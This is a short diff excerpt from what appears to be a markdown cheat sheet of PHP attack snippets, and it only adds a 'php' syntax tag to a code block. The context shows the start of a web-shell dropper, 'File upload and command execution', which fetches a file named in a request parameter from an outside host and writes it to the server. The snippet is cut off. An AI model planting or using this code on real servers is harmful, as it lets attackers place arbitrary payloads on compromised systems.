@@ -1,7 +1,7 @@
 ## PHP
 
 ### File upload and command execution
-```
+```php
 <?php if (isset($_REQUEST['fupload'])) {
 	file_put_contents($_REQUEST['fupload'],
 	file_get_contents("http://10.0.0.1/" . $_REQUEST['fupload']));
